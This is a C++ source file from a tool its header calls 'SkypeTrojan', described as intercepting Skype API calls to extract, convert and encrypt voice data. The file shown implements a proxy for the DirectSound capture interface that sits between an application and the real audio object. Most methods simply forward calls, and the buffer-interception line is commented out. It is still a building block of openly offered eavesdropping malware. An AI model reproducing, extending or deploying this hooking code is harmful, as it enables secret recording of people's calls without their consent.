/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



/*
 * Tool name   : SkypeTrojan
 * Description : Tool to intercept Skype API calls and to extract voice data.
 *               The extracted data will be converted to MP3 and encrypted.
 * Version     : 
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */







#include <stdio.h>
#include <windows.h>
#include <DSound.h>
#include "MStalker.h"
#include "IDirectSound8CaptureReplacement.h"
//#include "IDirectSoundCaptureBufferReplacement.h"






/*
 * Constructors and destructor.
 *
 */

IDirectSound8CaptureReplacement::IDirectSound8CaptureReplacement(IDirectSoundCapture8 *pIDirectSound8CaptureOriginal)
{
  printDebug("IDirectSound8CaptureReplacement(originalParameter)");
  mIDirectSound8CaptureOriginal = pIDirectSound8CaptureOriginal;
}


IDirectSound8CaptureReplacement::IDirectSound8CaptureReplacement()
{
  printDebug("IDirectSound8CaptureReplacement()");
}

IDirectSound8CaptureReplacement::~IDirectSound8CaptureReplacement()
{
  printDebug("~IDirectSound8CaptureReplacement()");

  if (mIDirectSound8CaptureOriginal)
    mIDirectSound8CaptureOriginal->~IDirectSoundCapture8();
}








/*
 * Increment the reference counter
 *
 */

ULONG __stdcall IDirectSound8CaptureReplacement::AddRef()
{
  ULONG mRetVal = 0;
  printDebug("AddRef()");


  if (mIDirectSound8CaptureOriginal)
    mRetVal = mIDirectSound8CaptureOriginal->AddRef();
  
  return(mRetVal);
}



/*
 * Decrement the reference counter
 *
 */

ULONG __stdcall IDirectSound8CaptureReplacement::Release()
{
  ULONG mRetVal = 0;

  printDebug("Release()");


  if (mIDirectSound8CaptureOriginal)
    mRetVal = mIDirectSound8CaptureOriginal->Release();

  return(mRetVal);
}



/*
 * Query the DS instance
 *
 */

HRESULT __stdcall IDirectSound8CaptureReplacement::QueryInterface(REFIID iid, void** ppv)
{
  HRESULT mRetVal = 0;

  printDebug("QueryInterface()");


  if (mIDirectSound8CaptureOriginal)
    mRetVal = mIDirectSound8CaptureOriginal->QueryInterface(iid, ppv);

  return(mRetVal);
}








/*
 * Create a sound capturing buffer
 *
 */

HRESULT __stdcall IDirectSound8CaptureReplacement::CreateCaptureBuffer(LPCDSCBUFFERDESC pcDSCBufferDesc, LPDIRECTSOUNDCAPTUREBUFFER * ppDSCBuffer, LPUNKNOWN pUnkOuter)
{
  long mRetVal = 0;

  printDebug("CreateCaptureBuffer()");

  if (mIDirectSound8CaptureOriginal)
    mRetVal = mIDirectSound8CaptureOriginal->CreateCaptureBuffer(pcDSCBufferDesc, ppDSCBuffer, pUnkOuter);

  /*
   * Sit in between the caller and the real destination object (callee)
   *
   */

//  *ppDSCBuffer = new IDirectSoundCaptureBufferReplacement(*ppDSCBuffer, pcDSCBufferDesc->dwBufferBytes);

  return(mRetVal);
}









/*
 * Get current caps settings
 *
 */

HRESULT __stdcall IDirectSound8CaptureReplacement::GetCaps(LPDSCCAPS pDSCCaps)
{
  HRESULT mRetVal = 0;

  printDebug("GetCaps()");


  if (mIDirectSound8CaptureOriginal)
    mRetVal = mIDirectSound8CaptureOriginal->GetCaps(pDSCCaps);

  return(mRetVal);
}



/*
 * Initialize DS interface
 *
 */

HRESULT __stdcall IDirectSound8CaptureReplacement::Initialize(LPCGUID pcGuidDevice)
{
  HRESULT mRetVal = ERROR_SUCCESS; //0;

  printDebug("Initialize()");

  if (mIDirectSound8CaptureOriginal)
    mRetVal = mIDirectSound8CaptureOriginal->Initialize(pcGuidDevice);

  return(mRetVal);
}
